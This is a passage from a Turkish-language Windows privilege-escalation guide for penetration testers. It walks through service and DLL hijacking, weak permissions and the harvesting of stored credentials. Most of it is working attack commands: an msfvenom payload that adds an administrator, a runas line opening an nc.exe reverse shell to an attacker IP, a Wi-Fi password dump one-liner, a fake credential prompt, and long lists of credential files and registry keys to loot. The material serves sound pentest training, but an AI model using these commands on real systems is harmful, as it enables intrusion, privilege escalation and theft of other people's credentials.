msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Kurtarma İşlemleri

Windows, bir hizmet başarısız olduğunda alınacak önlemleri belirlemek için kullanıcılara izin verir. Bu özellik bir ikili dosyaya işaret etmek üzere yapılandırılabilir. Bu ikili dosya değiştirilebilirse, ayrıcalık yükseltme mümkün olabilir. Daha fazla ayrıntıya [resmi belgelerde](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN) bulunabilir.

## Uygulamalar

### Yüklü Uygulamalar

**İkili dosyaların izinlerini** kontrol edin (belki birini üzerine yazabilir ve ayrıcalıkları yükseltebilirsiniz) ve **dizinlerin** izinlerini kontrol edin ([DLL Kaldırma](dll-hijacking/)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

### Yazma İzinleri

Bazı yapılandırma dosyalarını değiştirip özel bir dosyayı okuyup okuyamayacağınızı veya bir Yönetici hesabı tarafından yürütülecek bir ikili dosyayı değiştirip değiştiremeyeceğinizi kontrol edin (schedtasks).

Sistemde zayıf klasör/dosya izinlerini bulmanın bir yolu şöyledir:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Başlangıçta çalıştır

**Farklı bir kullanıcı tarafından çalıştırılacak bir kayıt defteri veya ikili dosyayı üzerine yazabileceğinizi kontrol edin.**\
**Ayrıcalıkları yükseltmek için ilginç otomatik çalıştırma konumlarını öğrenmek için** aşağıdaki sayfayı **okuyun**:

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### Sürücüler

**Muhtemel üçüncü taraf garip/korunmasız sürücüler arayın**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

## YOL DLL Kaçırma

Eğer **PATH'te bulunan bir klasörde yazma izinleriniz varsa**, bir süreç tarafından yüklenen bir DLL'yi kaçırabilir ve **yetkileri yükseltebilirsiniz**.

PATH içindeki tüm klasörlerin izinlerini kontrol edin:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Bu denetimi nasıl kötüye kullanabileceğiniz hakkında daha fazla bilgi için:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## Ağ

### Paylaşımlar

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts dosyası

Diğer bilinen bilgisayarları hosts dosyasında sabitlenmiş olarak kontrol edin

```
type C:\Windows\System32\drivers\etc\hosts
```

### Ağ Arayüzleri ve DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Açık Portlar

Dışarıdan **kısıtlanmış hizmetleri** kontrol edin

```bash
netstat -ano #Opened ports?
```

### Yönlendirme Tablosu

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP Tablosu

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Güvenlik Duvarı Kuralları

[**Güvenlik Duvarı ile ilgili komutlar için bu sayfaya bakın**](../basic-cmd-for-pentesters.md#firewall) **(kuralları listele, kurallar oluştur, kapat, kapat...)**

Daha fazla [ağ taraması komutu burada](../basic-cmd-for-pentesters.md#network)

### Windows Alt Sistemi Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binary `bash.exe` ayrıca `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` konumunda bulunabilir.

Root kullanıcısını elde ettiğinizde herhangi bir porta dinleyebilirsiniz (`nc.exe`'yi ilk kez bir porta dinlemek için kullandığınızda, güvenlik duvarı tarafından `nc`'nin izin verilip verilmeyeceği GUI aracılığıyla sorulacaktır).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Bash'ı kolayca root olarak başlatmak için `--default-user root` komutunu deneyebilirsiniz.

`WSL` dosya sistemini `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` klasöründe keşfedebilirsiniz.

## Windows Kimlik Bilgileri

### Winlogon Kimlik Bilgileri

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

### Kimlik bilgileri yöneticisi / Windows kasası

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault, **Windows**'un **kullanıcıları otomatik olarak giriş yapabileceği sunucular, web siteleri ve diğer programlar için kullanıcı kimlik bilgilerini depolar**. İlk bakışta, bu, kullanıcıların Facebook kimlik bilgilerini, Twitter kimlik bilgilerini, Gmail kimlik bilgilerini vb. depolayabileceği ve böylece tarayıcılar aracılığıyla otomatik olarak giriş yapabileceği anlamına gelebilir. Ancak durum böyle değil.

Windows Vault, Windows'un kullanıcıları otomatik olarak giriş yapabileceği kimlik bilgilerini depolar, yani **Windows'un bir kaynağa erişmek için kimlik bilgilerine ihtiyaç duyan herhangi bir Windows uygulaması**, bu Kimlik Bilgileri Yöneticisi ve Windows Vault'tan yararlanabilir ve kullanıcıların sürekli olarak kullanıcı adı ve şifreyi girmesi yerine sağlanan kimlik bilgilerini kullanabilir.

Uygulamalar Kimlik Bilgileri Yöneticisi ile etkileşime geçmedikçe, belirli bir kaynağın kimlik bilgilerini kullanmalarının mümkün olmadığını düşünmüyorum. Bu nedenle, uygulamanızın kasayı kullanmak istemesi durumunda, varsayılan depolama kasasından bu kaynağın kimlik bilgilerini nasıl alacağını **kimlik bilgilerini talep etmek üzere kimlik bilgileri yöneticisiyle iletişim kurması gerekmektedir**.

Makinede depolanan kimlik bilgilerini listelemek için `cmdkey`'i kullanın.

```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```

Ardından kayıtlı kimlik bilgilerini kullanmak için `runas`'ı `/savecred` seçenekleriyle kullanabilirsiniz. Aşağıdaki örnek, bir SMB paylaşımı aracılığıyla uzak bir ikili dosyayı çağırıyor.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

`runas` komutunu sağlanan bir kimlik bilgi seti ile kullanma.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Not: mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials\_file\_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault\_password\_view.html) veya [Empire Powershells modülünden](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/dumpCredStore.ps1).

### DPAPI

**Veri Koruma API'si (DPAPI)**, verilerin simetrik şifrelemesi için bir yöntem sağlar ve genellikle Windows işletim sisteminde asimetrik özel anahtarların simetrik şifrelemesi için kullanılır. Bu şifreleme, entropiye önemli ölçüde katkıda bulunan bir kullanıcı veya sistem sırrını kullanır.

**DPAPI, kullanıcının giriş sırlarından türetilen simetrik bir anahtar aracılığıyla anahtarların şifrelenmesini sağlar**. Sistem şifrelemesi içeren senaryolarda, sistem alan kimlik doğrulama sırlarını kullanır.

DPAPI kullanılarak şifrelenmiş kullanıcı RSA anahtarları, `%APPDATA%\Microsoft\Protect\{SID}` dizininde depolanır, burada `{SID}` kullanıcının [Güvenlik Tanımlayıcısını](https://en.wikipedia.org/wiki/Security\_Identifier) temsil eder. **DPAPI anahtarı, genellikle kullanıcının özel anahtarlarını koruyan anahtarla aynı dosyada bulunan anahtar**, tipik olarak 64 byte'lık rastgele veriden oluşur. (Bu dizine erişim kısıtlıdır ve CMD'de `dir` komutuyla içeriğini listelemeyi engeller, ancak PowerShell aracılığıyla listelenebilir).

```powershell
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

**Mimikatz modülünü** uygun argümanlarla (`/pvk` veya `/rpc`) kullanarak şifrelemeyi çözebilirsiniz.

Genellikle **ana şifre ile korunan kimlik dosyaları** şurada bulunur:

```powershell
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

**Mimikatz modülü** `dpapi::cred`'i uygun `/masterkey` ile kullanarak şifrelemeyi çözebilirsiniz.\
Eğer kök kullanıcıysanız, `sekurlsa::dpapi` modülü ile **bellekten** birçok **DPAPI masterkey** çıkarabilirsiniz.

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### PowerShell Kimlik Bilgileri

**PowerShell kimlik bilgileri** genellikle **betik** ve otomasyon görevleri için şifrelenmiş kimlik bilgilerini saklamak için kullanılır. Kimlik bilgileri genellikle **DPAPI** kullanılarak korunur, bu da genellikle yalnızca aynı kullanıcı tarafından ve aynı bilgisayarda oluşturuldukları bilgisayar üzerinde çözülebileceği anlamına gelir.

Dosyasında bulunan bir PS kimlik bilgisini **çözmek** için şunları yapabilirsiniz:

```powershell
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Kaydedilmiş RDP Bağlantıları

Onları `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\` ve `HKCU\Software\Microsoft\Terminal Server Client\Servers\` dizinlerinde bulabilirsiniz.

### Son Zamanlarda Çalıştırılan Komutlar

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Uzak Masaüstü Kimlik Bilgileri Yöneticisi**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

**Mimikatz** `dpapi::rdg` modülünü uygun `/masterkey` ile kullanarak **.rdg dosyalarını** şifreleyebilirsiniz.\
Mimikatz `sekurlsa::dpapi` modülü ile bellekten birçok DPAPI anahtarını çıkarabilirsiniz.

### Yapışkan Notlar

İnsanlar genellikle Windows iş istasyonlarında StickyNotes uygulamasını kullanarak **şifreleri** ve diğer bilgileri kaydederler, bu dosyanın bir veritabanı dosyası olduğunun farkında olmadan. Bu dosya `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumunda bulunur ve her zaman aranmaya ve incelenmeye değerdir.

### AppCmd.exe

**AppCmd.exe**'den şifreleri kurtarmak için Yönetici olmanız ve Yüksek Bütünlük seviyesinde çalışmanız gerektiğini unutmayın.\
**AppCmd.exe** `%systemroot%\system32\inetsrv\` dizininde bulunur.\
Bu dosya mevcutsa, bazı **kimlik bilgilerinin** yapılandırılmış olabileceği ve **kurtarılabilir** olduğu mümkündür.

Bu kod [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)'dan çıkarılmıştır:

```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` dosyasının varlığını kontrol edin.\
Yükleyiciler **SYSTEM ayrıcalıklarıyla çalıştırılır**, birçok yükleyici **DLL Yan Yükleme** açığına sahiptir ([**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc) adresinden bilgi alınmıştır).

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Dosyalar ve Kayıt Defteri (Kimlik Bilgileri)

### Putty Kimlik Bilgileri

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

### Putty SSH Anahtarları

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Kayıt Defterinde SSH anahtarları

SSH özel anahtarları, `HKCU\Software\OpenSSH\Agent\Keys` kayıt defteri anahtarının içine depolanabilir, bu yüzden orada ilginç bir şey olup olmadığını kontrol etmelisiniz:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Eğer bu yol içinde herhangi bir giriş bulursanız, muhtemelen kaydedilmiş bir SSH anahtarı olacaktır. Bu şifrelenmiş olarak depolanmıştır ancak [https://github.com/ropnop/windows\_sshagent\_extract](https://github.com/ropnop/windows\_sshagent\_extract) kullanılarak kolayca şifresi çözülebilir.\
Bu teknik hakkında daha fazla bilgi burada: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Eğer `ssh-agent` servisi çalışmıyorsa ve otomatik olarak başlamasını istiyorsanız, şunu çalıştırın:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

{% hint style="info" %}
Bu teknik artık geçerli değil gibi görünüyor. Bazı ssh anahtarları oluşturmayı denedim, onları `ssh-add` ile ekledim ve bir makineye ssh üzerinden giriş yapmaya çalıştım. HKCU\Software\OpenSSH\Agent\Keys kaydı mevcut değil ve procmon, asimetrik anahtar kimlik doğrulaması sırasında `dpapi.dll`'nin kullanımını tespit etmedi.
{% endhint %}

### Otomatik dosyalar

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Ayrıca bu dosyaları **metasploit** kullanarak da arayabilirsiniz: _post/windows/gather/enum\_unattend_

Örnek içerik:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```

### SAM ve SYSTEM yedeklemeleri

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

### Bulut Kimlik Bilgileri

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

**SiteList.xml** dosyasını arayın

### Önbelleğe Alınmış GPP Şifresi

Daha önce mevcut olan bir özellik, Grup İlkesi Tercihleri (GPP) aracılığıyla bir grup makineye özel yerel yönetici hesaplarının dağıtılmasına izin veriyordu. Ancak, bu yöntemin ciddi güvenlik açıkları vardı. İlk olarak, SYSVOL'de XML dosyaları olarak depolanan Grup İlkesi Nesnelerine (GPO'lar) herhangi bir etki alanı kullanıcısı tarafından erişilebilirdi. İkinci olarak, bu GPP'lerdeki şifreler, genel olarak belgelenmiş varsayılan bir anahtar kullanılarak AES256 ile şifrelenmiş olmasına rağmen, herhangi bir kimlik doğrulama yapmış kullanıcı tarafından çözülebilirdi. Bu ciddi bir risk oluşturuyordu, çünkü kullanıcılara yüksek ayrıcalıklar kazanma olanağı tanıyabilirdi.

Bu riski azaltmak için, yerel olarak önbelleğe alınmış GPP dosyalarını taramak için bir işlev geliştirildi. Bu dosyaların içinde boş olmayan bir "cpassword" alanı bulunduğunda, işlev şifreyi çözer ve özel bir PowerShell nesnesi döndürür. Bu nesne, GPP ve dosyanın konumu hakkında detaylar içerir ve bu güvenlik açığının tanımlanması ve giderilmesine yardımcı olur.

Bu dosyaları aramak için `C:\ProgramData\Microsoft\Group Policy\history` veya _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista'dan önce)_ konumuna bakın:

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**cPassword'i çözmek için:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Kullanarak şifreleri almak için crackmapexec:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Yapılandırması

```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Web.config dosyası örneği kimlik bilgileriyle:

```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```

### OpenVPN kimlik bilgileri

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Günlükler

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Kimlik bilgilerini isteyin

Her zaman **kullanıcıdan kimlik bilgilerini veya hatta farklı bir kullanıcının kimlik bilgilerini girmesini isteyebilirsiniz** eğer onları biliyor olabileceğini düşünüyorsanız (müşteriden **kimlik bilgilerini sormak** gerçekten **risklidir**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Kimlik bilgileri içeren olası dosya adları**

Bazı zamanlar **şifreleri** **açık metin** veya **Base64** içeren bilinen dosyalar

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Tüm önerilen dosyaları arayın:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Geri Dönüşüm Kutusundaki Kimlik Bilgileri

Ayrıca, içinde kimlik bilgileri aramak için Kutuyu kontrol etmelisiniz.

Çeşitli programlar tarafından kaydedilen **şifreleri kurtarmak** için şu bağlantıyı kullanabilirsiniz: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password\_recovery\_tools.html)

### Kayıt Defterinde

**Kimlik bilgileri içeren diğer olası kayıt defteri anahtarları**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Kayıttan openssh anahtarlarını çıkarın.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Tarayıcı Geçmişi

**Chrome veya Firefox**'dan şifrelerin saklandığı veritabanlarını kontrol etmelisiniz.\
Ayrıca tarayıcıların geçmişini, yer imlerini ve favorilerini kontrol edin, belki bazı **şifreler orada** saklanmıştır.

Tarayıcılardan şifreleri çıkarmak için araçlar:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Üzerine Yazma**

**Component Object Model (COM)**, Windows işletim sistemi içinde yer alan, farklı dillerdeki yazılım bileşenleri arasında **iletişim** sağlayan bir teknolojidir. Her COM bileşeni bir sınıf kimliği (CLSID) ile tanımlanır ve her bileşen bir veya daha fazla arayüzü, arayüz kimlikleri (IIDs) ile işlevselliği açığa çıkarır.

